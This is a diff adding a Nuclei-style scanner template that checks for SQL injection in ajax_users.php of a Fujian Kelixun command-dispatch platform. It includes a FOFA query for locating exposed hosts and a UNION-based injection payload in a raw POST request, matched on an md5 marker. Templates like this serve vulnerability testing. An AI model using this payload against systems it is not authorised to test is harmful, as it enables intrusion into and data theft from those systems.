@@ -1,0 +1,24 @@
+id: zhdd-ajax_users-sql-injection
+
+info:
+  name: 福建科立讯通信 指挥调度管理平台 ajax_users.php SQL注入漏洞
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="指挥调度管理平台"
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /app/ext/ajax_users.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(123123),0x7e),NULL,NULL,NULL-- -
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code==200 && contains_all(body,'~4297f44b13955235245b2497399d7a93~')"
